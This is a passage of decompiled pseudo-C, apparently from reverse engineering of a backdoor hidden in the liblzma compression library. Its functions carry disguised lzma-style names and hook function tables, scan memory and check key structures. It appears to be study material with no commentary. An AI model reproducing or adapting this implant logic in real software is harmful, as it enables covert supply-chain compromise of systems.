{
  unsigned __int64 v10; // r15
  _QWORD *v11; // r12
  int v12; // edx
  int v13; // eax
  __int64 v14; // rbx
  __int64 v15; // rdx
  __int64 (__fastcall *v16)(__int64); // rax
  unsigned __int64 v17; // rax
  __int64 v18; // rsi
  __int64 v19; // r8
  unsigned __int64 v20; // rcx
  __int64 v21; // rdx
  __int64 v22; // rdx
  char *v23; // rdi
  __int64 v24; // rcx
  __int64 i; // rax
  __int64 v26; // r13
  __int64 v27; // rax
  __int64 v28; // r12
  __int64 v30; // [rsp+0h] [rbp-F8h]
  __int64 v33; // [rsp+18h] [rbp-E0h]
  unsigned __int64 v34; // [rsp+20h] [rbp-D8h]
  __int64 v35; // [rsp+28h] [rbp-D0h]
  __int128 v36; // [rsp+37h] [rbp-C1h] BYREF
  char v37[177]; // [rsp+47h] [rbp-B1h] BYREF

  if ( !a1 )
    return 0LL;
  if ( !a2 )
    return 0LL;
  if ( !a4 )
    return 0LL;
  if ( a3 > 0xFFFFFFFFFFFFFFDELL )
    return 0LL;
  v10 = a3 + 32;
  if ( !a7 )
    return 0LL;
  if ( a4 < v10 )
    return 0LL;
  v11 = *(_QWORD **)(a7 + 8);
  if ( !v11 )
    return 0LL;
  v12 = *(_DWORD *)a1;
  if ( *(_DWORD *)a1 == 2 )
  {
    v15 = *(_QWORD *)(a1 + 32);
    v36 = 0LL;
    memset(v37, a4 < v10, 0x79uLL);
    if ( !v15 )
      return 0LL;
    v16 = (__int64 (__fastcall *)(__int64))v11[9];
    if ( !v16 )
      return 0LL;
    if ( !v11[10] )
      return 0LL;
    if ( !v11[8] )
      return 0LL;
    v33 = v15;
    v30 = v16(v15);
    v35 = ((__int64 (__fastcall *)(__int64))v11[10])(v33);
    v17 = ((__int64 (__fastcall *)(__int64, __int64, __int64, _QWORD, _QWORD, _QWORD))v11[8])(
            v35,
            v30,
            4LL,
            0LL,
            0LL,
            0LL);
    if ( v17 > 0x85 )
      return 0LL;
    LODWORD(v36) = _byteswap_ulong(v17);
    v34 = v17;
    if ( v17 != ((__int64 (__fastcall *)(__int64, __int64, __int64, char *, unsigned __int64, _QWORD))v11[8])(
                  v35,
                  v30,
                  4LL,
                  (char *)&v36 + 4,
                  v17,
                  0LL) )
      return 0LL;
    v18 = v34 + 4;
    v19 = (__int64)v11;
    v20 = a4 - a3;
    v21 = a2 + a3;
LABEL_33:
    v13 = sub_72E0((__int64)&v36, v18, v21, v20, v19);
    goto LABEL_16;
  }
  if ( v12 > 2 )
  {
    if ( v12 != 3 )
      return 0LL;
    v22 = *(_QWORD *)(a1 + 48);
    v23 = v37;
    v24 = 5LL;
    v36 = 0LL;
    while ( v24 )
    {
      *(_DWORD *)v23 = 0;
      v23 += 4;
      --v24;
    }
    if ( !v22 )
      return 0LL;
    LODWORD(v36) = 0x20000000;
    for ( i = 0LL; i != 32; ++i )
      v37[i - 12] = *(_BYTE *)(v22 + i);
    v21 = a2 + a3;
    v19 = (__int64)v11;
    v18 = 36LL;
    v20 = a4 - a3;
    goto LABEL_33;
  }
  if ( v12 )
  {
    if ( v12 != 1 )
      return 0LL;
    v13 = sub_3B70(*(_QWORD *)(a1 + 16), a2 + a3, a4 - a3, a7);
  }
  else
  {
    v13 = sub_7540(*(_QWORD *)(a1 + 8), a2 + a3, a4 - a3, *(_QWORD *)(a7 + 8));
  }
LABEL_16:
  if ( v13 )
  {
    v14 = *(_QWORD *)(a7 + 8);
    if ( v14 )
    {
      if ( !(unsigned int)sub_71A0(v14 + 112, 6u) )
      {
        if ( a6 )
        {
          v26 = (*(__int64 (__fastcall **)(__int64, _QWORD, __int64, __int64))(v14 + 112))(1088LL, 0LL, a6, 57LL);
          if ( v26 )
          {
            v27 = (*(__int64 (**)(void))(v14 + 120))();
            v28 = v27;
            if ( v27 )
            {
              if ( (*(unsigned int (__fastcall **)(__int64, _QWORD, _QWORD, _QWORD, __int64))(v14 + 128))(
                     v27,
                     0LL,
                     0LL,
                     0LL,
                     v26) == 1
                && (*(unsigned int (__fastcall **)(__int64, __int64, __int64, __int64, unsigned __int64))(v14 + 136))(
                     v28,
                     a5,
                     114LL,
                     a2,
                     v10) == 1 )
              {
                (*(void (__fastcall **)(__int64))(v14 + 144))(v28);
                (*(void (__fastcall **)(__int64))(v14 + 152))(v26);
                return 1LL;
              }
              (*(void (__fastcall **)(__int64))(v14 + 144))(v28);
            }
            (*(void (__fastcall **)(__int64))(v14 + 152))(v26);
          }
        }
      }
    }
  }
  return 0LL;
}

//----- (0000000000007950) ----------------------------------------------------
__int64 __fastcall Llength_encoder_reset_0(_QWORD *a1)
{
  __int64 v1; // rdx
  __int64 result; // rax
  __int64 v3; // rax

  v1 = a1[3];
  result = 0LL;
  if ( (unsigned __int64)(v1 - 32) <= 0x20 )
  {
    v3 = 0LL;
    while ( *(char *)(*a1 + v3) >= 0 )
    {
      if ( v1 == ++v3 )
        return 0LL;
    }
    return 1LL;
  }
  return result;
}

//----- (0000000000007980) ----------------------------------------------------
_BOOL8 __fastcall Lstream_decoder_mt_get_progress_0(
        unsigned __int64 *a1,
        __int64 a2,
        unsigned __int64 *a3,
        __int64 *a4)
{
  unsigned __int64 v9; // rbx
  unsigned __int64 v10; // rbp
  __int64 v11; // rsi
  unsigned __int64 v12; // rdi
  __int64 v13; // rsi

  if ( !a2 )
    return 0LL;
  if ( !a1 || !a3 || !a4 )
    return 0LL;
  if ( (*(_BYTE *)(a2 + 86) & *(_BYTE *)(a2 + 87) & 0x80u) != 0 )
  {
    v9 = 0LL;
    v10 = 0LL;
    v11 = 72LL;
  }
  else
  {
    v9 = 8 * *(char *)(a2 + 87);
    v10 = 8 * *(char *)(a2 + 86);
    v11 = v9 + 8;
    if ( v9 < v10 )
      v11 = v10 + 8;
  }
  if ( !(unsigned int)Lhc_find_func_1((unsigned __int64)a1, v11, a2) )
    return 0LL;
  if ( *(char *)(a2 + 86) < 0 )
    v12 = *a1;
  else
    v12 = a1[v10 / 8];
  *a3 = v12;
  if ( *(char *)(a2 + 87) < 0 )
    v13 = a1[3];
  else
    v13 = a1[v9 / 8];
  *a4 = v13;
  return (unsigned int)Lhc_find_func_1(v12, v13, a2) != 0;
}

//----- (0000000000007A50) ----------------------------------------------------
_BOOL8 __fastcall Lthreads_stop_0(__int64 a1, __int64 a2)
{
  unsigned __int64 v4; // rdi
  unsigned __int64 v5; // r13
  unsigned __int64 *v6; // r12
  __int64 v7; // r13
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rax
  unsigned __int64 **v10; // r12
  unsigned int v11; // r14d
  unsigned __int64 **v12; // r15
  unsigned int v13; // eax

  if ( a1 )
  {
    if ( a2 )
    {
      v4 = *(_QWORD *)(a2 + 72);
      if ( v4 )
      {
        if ( (unsigned int)Lhc_find_func_1(v4, 8LL, a2) )
        {
          v5 = **(_QWORD **)(a2 + 72);
          if ( (unsigned int)Lhc_find_func_1(v5, 32LL, a2) )
          {
            v6 = *(unsigned __int64 **)(v5 + 16);
            if ( *(char *)(a2 + 85) >= 0 )
              v6 = *(unsigned __int64 **)(v5 + 4 * *(char *)(a2 + 85));
            v7 = 72LL;
            if ( (*(_BYTE *)(a2 + 87) & *(_BYTE *)(a2 + 86) & 0x80u) == 0 )
            {
              v8 = 8 * *(char *)(a2 + 87);
              v9 = 8 * *(char *)(a2 + 86);
              v7 = v8 + 8;
              if ( v8 < v9 )
                v7 = v9 + 8;
            }
            if ( (unsigned int)Lhc_find_func_1((unsigned __int64)v6, 8LL, a2)
              && (unsigned int)Lhc_find_func_1(*v6, 1024LL, a2) )
            {
              v10 = (unsigned __int64 **)*v6;
              if ( *(char *)(a2 + 84) < 0 )
              {
                v11 = 0;
                v12 = v10 + 128;
                while ( v10 < v12 )
                {
                  if ( (unsigned int)Lhc_find_func_1((unsigned __int64)v10, v7, a2)
                    && Lstream_decoder_mt_get_progress_0(*v10, a2, (unsigned __int64 *)a1, (__int64 *)(a1 + 24)) )
                  {
                    if ( v11 <= 1 )
                    {
                      v13 = (unsigned int)table_get(*(char **)a1, *(_QWORD *)a1 + 7LL);
                      if ( v13 == 2448 || v13 == 3336 )
                        ++v11;
                    }
                    else if ( (unsigned int)Llength_encoder_reset_0((_QWORD *)a1) )
                    {
                      return 1LL;
                    }
                  }
                  ++v10;
                }
              }
              else if ( Lstream_decoder_mt_get_progress_0(
                          v10[*(char *)(a2 + 84)],
                          a2,
                          (unsigned __int64 *)a1,
                          (__int64 *)(a1 + 24)) )
              {
                return (unsigned int)Llength_encoder_reset_0((_QWORD *)a1) != 0;
              }
            }
          }
        }
      }
    }
    return 0LL;
  }
  return 0LL;
}

//----- (0000000000007BF0) ----------------------------------------------------
__int64 __fastcall installed_func_2(unsigned int *a1, int a2, __int64 a3)
{
  int v4; // r13d
  unsigned int v5; // ebp
  __int64 (__fastcall *v6)(_QWORD, __int64); // rax
  int v7; // eax
  int *v8; // rax
  int v9; // eax
  int v11; // [rsp+0h] [rbp-3Ch] BYREF

  if ( !a1 )
    return 0LL;
  if ( a3 )
  {
    v4 = -1;
    v5 = 0;
    while ( 1 )
    {
      v11 = 0;
      v6 = *(__int64 (__fastcall **)(_QWORD, __int64))(a3 + 96);
      if ( !v6 || !*(_QWORD *)(a3 + 80) )
        goto LABEL_14;
      v7 = v6(v5, 0x7FFFFFFFLL);
      if ( v7 < 0 )
        break;
      if ( v7 )
      {
        v8 = &v11;
        goto LABEL_10;
      }
LABEL_12:
      if ( ++v4 == a2 )
      {
        *a1 = v5;
        return 1LL;
      }
LABEL_14:
      if ( ++v5 == 64 )
        return 0LL;
    }
    v8 = (int *)(*(__int64 (**)(void))(a3 + 80))();
LABEL_10:
    v9 = *v8;
    if ( v9 != 22 && v9 != 107 )
      goto LABEL_14;
    goto LABEL_12;
  }
  return 0LL;
}

//----- (0000000000007C90) ----------------------------------------------------
__int64 __fastcall installed_func_3(__int64 a1, unsigned int *a2, int a3, int a4)
{
  __int64 v5; // rdx
  int **v6; // rax
  int *v7; // r14
  int v9; // r14d
  __int64 v10; // r13
  int v11; // r12d
  int *v12; // rax
  int v13; // eax
  char v15[57]; // [rsp+1Fh] [rbp-39h] BYREF

  if ( !a1 )
    return 0LL;
  v5 = *(_QWORD *)(a1 + 16);
  if ( !v5 || !a2 )
    return 0LL;
  v6 = *(int ***)(a1 + 72);
  if ( !v6 )
    return installed_func_2(a2, a3, v5);
  v7 = *v6;
  if ( !(unsigned int)Lhc_find_func_1(*v6, 4LL, a1) )
  {
LABEL_13:
    v5 = *(_QWORD *)(a1 + 16);
    return installed_func_2(a2, a3, v5);
  }
  if ( a4 )
  {
    if ( a4 == 1 )
    {
      v9 = v7[1];
      goto LABEL_11;
    }
    return 0LL;
  }
  v9 = *v7;
LABEL_11:
  v15[0] = 0;
  v10 = *(_QWORD *)(a1 + 16);
  if ( v9 < 0 || !v10 || !*(_QWORD *)(v10 + 72) || !*(_QWORD *)(v10 + 80) )
    goto LABEL_13;
  while ( 1 )
  {
    v11 = (*(__int64 (__fastcall **)(_QWORD, char *, _QWORD))(v10 + 72))((unsigned int)v9, v15, 0LL);
    v12 = (int *)(*(__int64 (**)(void))(v10 + 80))();
    if ( v11 >= 0 )
      break;
    v13 = *v12;
    if ( v13 != 4 )
    {
      if ( v13 == 9 )
        goto LABEL_13;
      break;
    }
  }
  *a2 = v9;
  return 1LL;
}
// 2360: using guessed type __int64 __fastcall Lhc_find_func_1(_QWORD, _QWORD, _QWORD);
// 7C90: using guessed type char var_39[57];

//----- (0000000000007D80) ----------------------------------------------------
__int64 __fastcall Llzma_block_unpadded_size_1(int a1, int a2, int a3, int a4, __int64 a5)
{
  __int64 result; // rax
  __int64 v6; // rax
  __int64 v7; // r9
  int *v8; // rdi
  int v9; // r8d
  _DWORD *v10; // rsi
  _QWORD *v11; // rsi

  if ( !a5 )
    return 0LL;
  v6 = *(_QWORD *)(a5 + 32);
  if ( !v6 )
    return 0LL;
  v7 = *(_QWORD *)(v6 + 16);
  if ( !v7 || !*(_DWORD *)(v6 + 4) )
    return 0LL;
  if ( !a1 )
  {
    v8 = *(int **)(v6 + 200);
    if ( !v8 )
      return 0LL;
    v9 = *v8;
    if ( *v8 > 2 )
    {
      if ( v9 != 3 )
        return 0LL;
    }
    else
    {
      if ( v9 < 0 )
        return 0LL;
      *v8 = 3;
    }
  }
  if ( a2 )
  {
    v10 = *(_DWORD **)(v6 + 192);
    if ( v10 && *v10 <= 1u )
    {
      *v10 = 0;
      goto LABEL_16;
    }
    return 0LL;
  }
LABEL_16:
  v11 = *(_QWORD **)(v6 + 56);
  if ( !a3 )
    a4 = *((_DWORD *)v11 - 2) + 1;
  *(_DWORD *)(v6 + 64) = a4;
  result = 1LL;
  *v11 = v7;
  return result;
}

//----- (0000000000007E10) ----------------------------------------------------
__int64 __fastcall Llzma_rc_prices_1(char *a1, __int64 a2)
{
  __int64 v2; // rax
  unsigned __int64 *v4; // rdx
  unsigned __int64 *v5; // rcx
  unsigned __int64 v6; // r9
  char v7; // di
  unsigned __int64 v8; // r8
  unsigned __int64 *v9; // rt0
  unsigned __int64 v10; // rcx

  v2 = *(_QWORD *)(a2 + 48);
  if ( !a1 )
    return 0LL;
  if ( !v2 )
    return 0LL;
  v4 = *(unsigned __int64 **)(v2 + 56);
  if ( !v4 )
    return 0LL;
  v5 = *(unsigned __int64 **)(v2 + 64);
  if ( !v5 )
    return 0LL;
  v6 = *(_QWORD *)(v2 + 96);
  if ( !v6 || !*(_DWORD *)(v2 + 4) )
    return 0LL;
  v7 = *a1;
  if ( (v7 & 8) != 0 && *(_DWORD *)(a2 + 144) )
    return 1LL;
  v8 = *v5;
  if ( *v5 && v8 >= *(_QWORD *)(a2 + 88) && v8 < *(_QWORD *)(a2 + 96) )
  {
    *(_QWORD *)(v2 + 56) = v5;
    *(_QWORD *)(v2 + 64) = v4;
    v9 = v5;
    v5 = v4;
    v4 = v9;
  }
  v10 = *v5;
  *(_QWORD *)(v2 + 72) = *v4;
  *(_QWORD *)(v2 + 80) = v10;
  if ( (v7 & 8) != 0 )
  {
    if ( (v7 & 0x10) == 0 || *(_QWORD *)(v2 + 16) && *(_QWORD *)(v2 + 24) && *(_QWORD *)(v2 + 32) )
      goto LABEL_20;
    return 0LL;
  }
  *(_DWORD *)v2 = 1;
LABEL_20:
  *v4 = v6;
  return 1LL;
}

//----- (0000000000007ED0) ----------------------------------------------------
__int64 __fastcall Lstream_encoder_mt_init_part_0(__int64 a1)
{
  int v1; // eax
  bool v2; // cc
  __int64 result; // rax
  unsigned __int16 *v4; // rdx
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // rdx

  if ( !a1 )
    return 0LL;
  v1 = *(_DWORD *)(a1 + 260);
  if ( v1 > 2 )
  {
    v2 = (unsigned int)(v1 - 3) <= 1;
LABEL_7:
    if ( v2 )
      return 1LL;
    goto LABEL_15;
  }
  if ( v1 <= 0 )
  {
    if ( !v1 )
    {
      v2 = *(_QWORD *)(a1 + 232) <= 0xAEuLL;
      goto LABEL_7;
    }
LABEL_15:
    *(_DWORD *)(a1 + 260) = -1;
    return 0LL;
  }
  v4 = *(unsigned __int16 **)(a1 + 248);
  if ( !v4 )
    goto LABEL_15;
  v5 = *(_QWORD *)(a1 + 232);
  if ( v5 <= 0xAD )
    goto LABEL_15;
  v6 = *v4;
  if ( v6 < v5 )
    goto LABEL_15;
  if ( v6 + 96 >= v6 )
    v6 += 96LL;
  result = 1LL;
  if ( *(_QWORD *)(a1 + 224) < v6 )
    goto LABEL_15;
  return result;
}

//----- (0000000000007F50) ----------------------------------------------------
__int64 __fastcall Lworker_start_0(char **a1, unsigned __int64 a2, _QWORD *a3, __int64 a4)
{
  __int64 v5; // r8
  __int64 result; // rax
  __int64 v7; // r9
  char *v8; // rcx
  char *v10; // rdi
  bool v11; // cf
  unsigned __int64 v12; // rdi
  unsigned __int64 v13; // rax
  char *v14; // rbx
  __int64 v15; // rdx
  unsigned __int64 v16; // r14
  char v17; // r10
  __int64 v18; // rdx
  char v19; // r11
  unsigned __int32 v20; // edx
  unsigned __int64 v21; // r13
  unsigned __int64 v22; // rdx
  unsigned int *v23; // rbx
  unsigned __int32 v24; // edx
  char *v25; // rbx
  unsigned __int32 v26; // edx
  char *v27; // rcx

  if ( !a1 || a2 <= 6 )
    return 0LL;
  if ( !a3 || !a4 )
    return 0LL;
  v5 = *(_QWORD *)(a4 + 56);
  result = 0LL;
  if ( !v5 )
    return result;
  v7 = *(_QWORD *)(a4 + 64);
  if ( !v7 )
    return result;
  v8 = *a1;
  v10 = *a1;
  v11 = __CFADD__(a2, v10);
  v12 = (unsigned __int64)&v10[a2];
  if ( v11 )
    return result;
  v13 = 0LL;
  do
  {
    v14 = &v8[v13];
    v15 = 0LL;
    v16 = a2 - v13;
    while ( 1 )
    {
      v17 = v14[v15];
      if ( *(char *)(v5 + v15) > v17 || *(char *)(v5 + v15) < v17 )
        break;
      if ( ++v15 == 7 )
        goto LABEL_21;
    }
    v18 = 0LL;
    while ( 1 )
    {
      v19 = v14[v18];
      if ( *(char *)(v7 + v18) > v19 || *(char *)(v7 + v18) < v19 )
        break;
      if ( ++v18 == 7 )
        goto LABEL_21;
    }
    ++v13;
    v16 = a2 - v13;
  }
  while ( a2 - v13 != 6 );
  v14 = 0LL;
LABEL_21:
  if ( v13 <= 7 || !v14 )
    return 0LL;
  result = 0LL;
  v20 = _byteswap_ulong(*((_DWORD *)v14 - 2));
  if ( v20 <= 0x10000 )
  {
    v21 = (unsigned __int64)&v14[v20 - 8];
    if ( v12 >= v21 )
    {
      v22 = sub_7080(v14, v16);
      result = 0LL;
      if ( v22 < v16 )
      {
        v23 = (unsigned int *)&v14[v22];
        if ( (unsigned __int64)v23 < v21 )
        {
          v24 = _byteswap_ulong(*v23);
          if ( v24 <= 0x10000 )
          {
            v25 = (char *)v23 + v24 + 4;
            result = 0LL;
            if ( (unsigned __int64)v25 < v21 )
            {
              v26 = _byteswap_ulong(*(_DWORD *)v25);
              if ( v26 <= 0x10000 )
              {
                v27 = v25 + 4;
                if ( v21 < (unsigned __int64)&v25[v26 + 4] )
                {
                  if ( !v25[4] )
                  {
                    v27 = v25 + 5;
                    --v26;
                  }
                  *a1 = v27;
                  *a3 = v26;
                  return 1LL;
                }
              }
            }
          }
        }
      }
    }
  }
  return result;
}

//----- (00000000000080B0) ----------------------------------------------------
__int64 __fastcall Lbt_skip_func_part_0(__int64 a1, int a2)
{
  __int64 v2; // rbp
  __int64 setresgid; // rbx
  __int64 v4; // rdx
  __int64 v6; // rsi
  void (__fastcall *v8)(_QWORD); // rax

  if ( !global_ctx )
    return 0LL;
  v2 = global_ctx->field_10;
  if ( v2 )
  {
    setresgid = global_ctx->setresgid;
    if ( setresgid )
    {
      v4 = *(unsigned __int16 *)(setresgid + 132);
      if ( (_WORD)v4 )
      {
        v6 = *(_QWORD *)(setresgid + 136);
        if ( v6 )
        {
          if ( sub_7120(a2, v6, v4, global_ctx->field_10) >= 0 )
          {
            **(_QWORD **)(setresgid + 160) = *(_QWORD *)(setresgid + 216);
            return 1LL;
          }
        }
      }
      v8 = *(void (__fastcall **)(_QWORD))(v2 + 24);
      if ( v8 )
        v8(0LL);
    }
  }
  return 0LL;
}

//----- (0000000000008130) ----------------------------------------------------
__int64 __fastcall Llzma_code_part_1(__int64 a1, int a2, __int64 a3)
{
  __int64 v4; // rdi
  __int64 v5; // rcx
  __int64 v6; // rbx
  void (__fastcall *v7)(_QWORD); // rax
  __int64 v9; // rdx
  _QWORD *v10; // rsi
  bool v11; // cf
  int v12; // eax
  _QWORD v13[2]; // [rsp+3h] [rbp-15h] BYREF

  v4 = (unsigned int)a2;
  v13[0] = 0LL;
  v5 = *(_QWORD *)(global_ctx + 16);
  v6 = *(_QWORD *)(global_ctx + 32);
  *(_QWORD *)((char *)v13 + 5) = 0LL;
  if ( a2 >= 0 && a3 != 0 && a1 )
  {
    v9 = *(unsigned __int16 *)(v6 + 144);
    if ( !(_WORD)v9 || (v10 = *(_QWORD **)(v6 + 152)) == 0LL )
    {
      v11 = *(_DWORD *)(v6 + 184) == 0;
      v12 = *(_DWORD *)(v6 + 64);
      v10 = v13;
      *(_DWORD *)((char *)v13 + 5) = 0x1000000;
      BYTE4(v13[0]) = v12;
      LODWORD(v13[0]) = v11 ? 0x5000000 : 0x9000000;
      v9 = _byteswap_ulong(v13[0]) + 4LL;
    }
    sub_7120(v4, v10, v9, v5);
    **(_QWORD **)(v6 + 160) = *(_QWORD *)(v6 + 208);
    return 1LL;
  }
  else
  {
    if ( v5 )
    {
      v7 = *(void (__fastcall **)(_QWORD))(v5 + 24);
      if ( v7 )
        v7(0LL);
    }
    return 0LL;
  }
}
// 7120: using guessed type __int64 __fastcall sub_7120(_QWORD, _QWORD, _QWORD, _QWORD);
// CB58: using guessed type __int64 Llzma12_coder_1;

//----- (0000000000008200) ----------------------------------------------------
_BOOL8 __fastcall Lparse_lzma12_0(__int64 a1, __int64 a2)
{
  __int64 v3; // r9
  __int64 v5; // rcx
  _DWORD *v6; // rdi
  __int64 v7; // rcx
  char *v8; // rdi
  _BYTE v9[32]; // [rsp-20h] [rbp-B8h] BYREF
  char v10[16]; // [rsp+0h] [rbp-98h] BYREF
  char v11[32]; // [rsp+10h] [rbp-88h] BYREF
  char v12[104]; // [rsp+30h] [rbp-68h] BYREF

  if ( !a1 )
    return 0LL;
  if ( a2 )
  {
    v3 = *(_QWORD *)(a2 + 8);
    if ( v3 )
    {
      v5 = 12LL;
      v6 = v9;
      while ( v5 )
      {
        *v6++ = 0;
        --v5;
      }
      v7 = 28LL;
      v8 = v11;
      while ( v7 )
      {
        *(_DWORD *)v8 = 0;
        v8 += 4;
        --v7;
      }
      if ( (unsigned int)sub_71C0((__int64)v9, 0x30u, (__int64)v9, (__int64)v10, (__int64)v11, v3) )
        return (unsigned int)sub_71C0(a2 + 264, 0x39u, (__int64)v11, (__int64)v12, a1, *(_QWORD *)(a2 + 8)) != 0;
    }
  }
  return 0LL;
}
// 8200: using guessed type char var_98[16];
// 8200: using guessed type char var_68[104];

//----- (00000000000082A0) ----------------------------------------------------
__int64 __fastcall installed_func_0(__int64 a1, __int64 a2)
{
  __int64 v2; // rcx
  _DWORD *v4; // rdi
  unsigned int v5; // ecx
  __int64 v7; // r14
  _QWORD *v8; // rdi
  __int64 v9; // rsi
  _BYTE *v10; // rax
  bool v11; // sf
  _DWORD *v12; // rdi
  __int64 v13; // r11
  __int64 v14; // rcx
  __int64 *v15; // rdi
  __int64 v16; // rcx
  __int64 v17; // rcx
  _DWORD *v18; // rdi
  __int64 *v19; // rdi
  __int64 v20; // rcx
  _DWORD *v21; // rcx
  char v22; // al
  char v23; // dl
  __int64 v24; // r9
  __int64 v25; // r10
  __int128 *v26; // r11
  __int64 v27; // r15
  unsigned __int64 v28; // r13
  __int128 *v29; // rdi
  __int64 v30; // rcx
  __int128 *v31; // rsi
  _DWORD *v32; // rdi
  __int64 v33; // rcx
  __int128 v34; // xmm1
  __int128 v35; // xmm2
  unsigned __int64 v36; // rsi
  void (__fastcall *v37)(_QWORD); // rax
  _QWORD *v38; // r15
  __int64 v39; // r14
  char *v40; // r13
  __int64 j; // rax
  char v42; // cl
  __int64 v43; // rax
  __int128 *v44; // r14
  _BYTE *v46; // rax
  unsigned int v47; // edx
  unsigned __int8 v48; // si
  __int64 v49; // rsi
  int v50; // eax
  __int64 *v51; // rdi
  __int64 v52; // rcx
  char *v53; // r13
  unsigned int v54; // r15d
  __int64 v55; // r12
  bool v56; // sf
  __int64 v58; // rbx
  unsigned __int64 v59; // rbx
  __int64 v60; // rdx
  __int64 v61; // rax
  void (__fastcall *v62)(_QWORD); // rax
  __int128 *v63; // rdi
  __int64 v64; // rcx
  _DWORD *v65; // rsi
  __int64 v66; // rax
  __int64 v67; // r14
  __int64 v68; // r15
  __int64 v69; // rax
  unsigned int (__fastcall *v70)(_BYTE *, unsigned __int64, _OWORD *, _QWORD, __int64, _QWORD); // r15
  __int64 v71; // rax
  unsigned __int64 *v72; // rdi
  __int64 v73; // rcx
  __int128 *v74; // rsi
  __int64 v75; // rax
  __int64 v76; // rdx
  __int64 v77; // rcx
  __int64 v78; // rax
  __int64 *v79; // rsi
  _DWORD *v80; // rdi
  __int64 v81; // [rsp-EA8h] [rbp-EB0h]
  char *v82; // [rsp-EA0h] [rbp-EA8h]
  unsigned __int64 v83; // [rsp-E98h] [rbp-EA0h]
  void **i; // [rsp-E90h] [rbp-E98h]
  __int64 v85; // [rsp-E90h] [rbp-E98h]
  __int64 v86; // [rsp-E90h] [rbp-E98h]
  unsigned int v87; // [rsp-E88h] [rbp-E90h]
  __int64 v88; // [rsp-E88h] [rbp-E90h]
  char v89; // [rsp-E79h] [rbp-E81h] BYREF
  int v90; // [rsp-E78h] [rbp-E80h] BYREF
  int v91; // [rsp-E74h] [rbp-E7Ch] BYREF
  unsigned __int64 v92; // [rsp-E70h] [rbp-E78h] BYREF
  _QWORD v93[2]; // [rsp-E68h] [rbp-E70h]
  _OWORD v94[2]; // [rsp-E58h] [rbp-E60h] BYREF
  __int128 v95; // [rsp-E38h] [rbp-E40h] BYREF
  _BYTE v96[240]; // [rsp-E28h] [rbp-E30h] BYREF
  __int128 v97; // [rsp-D38h] [rbp-D40h] BYREF
  __int64 v98; // [rsp-D28h] [rbp-D30h] BYREF
  __int64 v99[2]; // [rsp-C38h] [rbp-C40h] BYREF
  int v100; // [rsp-C28h] [rbp-C30h]
  int v101; // [rsp-C24h] [rbp-C2Ch]
  unsigned __int64 v102; // [rsp-C20h] [rbp-C28h] BYREF
  _BYTE v103[96]; // [rsp-B18h] [rbp-B20h] BYREF
  int v104; // [rsp-AB8h] [rbp-AC0h]
  _DWORD v105[78]; // [rsp-AB3h] [rbp-ABBh] BYREF
  _BYTE v106[7]; // [rsp-97Bh] [rbp-983h]
  __int128 v107; // [rsp-918h] [rbp-920h] BYREF
  _BYTE v108[2320]; // [rsp-908h] [rbp-910h] BYREF
  void *retaddr; // [rsp+8h] [rbp+0h] BYREF

  v2 = 566LL;
  v4 = v108;
  v107 = 0LL;
  while ( v2 )
  {
    *v4++ = 0;
    --v2;
  }
  v90 = -1;
  if ( !a1 )
    return 0LL;
  if ( !*(_QWORD *)(a1 + 16) )
    return 0LL;
  if ( !*(_QWORD *)(a1 + 24) )
    return 0LL;
  v5 = *(_DWORD *)a1;
  if ( *(_DWORD *)a1 == 3
    && (*(_BYTE *)(*(_QWORD *)(a1 + 8) + 1LL) & 0x40) == 0
    && (!*(_QWORD *)(a1 + 48) || !*(_QWORD *)(a1 + 32) || *(_WORD *)(a1 + 40) != 48) )
  {
    return 0LL;
  }
  if ( !a2 )
    return 0LL;
  v7 = *(_QWORD *)(a2 + 8);
  if ( !v7 )
    return 0LL;
  v8 = *(_QWORD **)(a2 + 16);
  if ( !v8 || !v8[8] || !v8[10] )
    return 0LL;
  v9 = *(_QWORD *)(a2 + 32);
  if ( *(_DWORD *)v9 )
  {
    v10 = *(_BYTE **)(a1 + 8);
    if ( v10 )
    {
      if ( v5 == 1 )
        goto LABEL_37;
      if ( v5 == 2 )
        goto LABEL_43;
      if ( v5 )
        goto LABEL_39;
    }
    else if ( v5 )
    {
      if ( v5 != 1 )
        goto LABEL_39;
      goto LABEL_37;
    }
    v11 = (char)v10[1] < 0;
    goto LABEL_41;
  }
  if ( !v5 )
    return 0LL;
  v10 = *(_BYTE **)(a1 + 8);
  if ( v5 == 3 )
  {
    if ( (v10[2] & 0x20) != 0 )
      return 0LL;
LABEL_40:
    v11 = (char)v10[3] < 0;
LABEL_41:
    if ( v11 )
      goto LABEL_43;
    goto LABEL_42;
  }
  if ( v10 )
  {
    if ( v5 != 1 )
    {
      if ( v5 == 2 )
        goto LABEL_43;
LABEL_39:
      if ( v5 != 3 )
        goto LABEL_43;
      goto LABEL_40;
    }
  }
  else if ( v5 != 1 )
  {
    goto LABEL_43;
  }
LABEL_37:
  if ( (v10[1] & 1) == 0 )
LABEL_42:
    **(_DWORD **)(v9 + 200) = 3;
LABEL_43:
  if ( *(_DWORD *)a1 > 1u && *(_DWORD *)a1 != 3 )
    goto LABEL_45;
  if ( (*v10 & 0x40) != 0 )
  {
    v21 = *(_DWORD **)(v9 + 192);
    if ( !v21 )
      return 0LL;
    *v21 = 0;
  }
  if ( *(_DWORD *)a1 != 3 || (v22 = v10[1] & 0xC0, v22 == -64) )
  {
LABEL_45:
    v12 = v103;
    v13 = *(_QWORD *)(a2 + 56);
    v14 = 105LL;
    v97 = 0LL;
    while ( v14 )
    {
      *v12++ = 0;
      --v14;
    }
    v15 = v99;
    v16 = 71LL;
    v89 = 1;
    while ( v16 )
    {
      *(_DWORD *)v15 = 0;
      v15 = (__int64 *)((char *)v15 + 4);
      --v16;
    }
    v17 = 60LL;
    v91 = 0;
    v18 = v96;
    while ( v17 )
    {
      *v18++ = 0;
      --v17;
    }
    v19 = &v98;
    v20 = 60LL;
    v94[0] = 0LL;
    while ( v20 )
    {
      *(_DWORD *)v19 = 0;
      v19 = (__int64 *)((char *)v19 + 4);
      --v20;
    }
    v94[1] = 0LL;
    v95 = 0LL;
    if ( v13 && *(_QWORD *)(a2 + 64) && !(unsigned int)sub_71A0(v7 + 208, 9LL) )
    {
      v27 = 0LL;
      v28 = 0LL;
      v103[4] = v23;
      v29 = &v107;
      v30 = 570LL;
      v31 = &v95;
      *(_DWORD *)&v103[5] = 0x2000000;
      while ( v30 )
      {
        *(_DWORD *)v29 = 0;
        v29 = (__int128 *)((char *)v29 + 4);
        --v30;
      }
      v32 = v105;
      *(_DWORD *)&v103[21] = 469762048;
      v33 = 64LL;
      v93[0] = v25;
      v34 = *v26;
      LOBYTE(v95) = 0x80;
      v93[1] = v24;
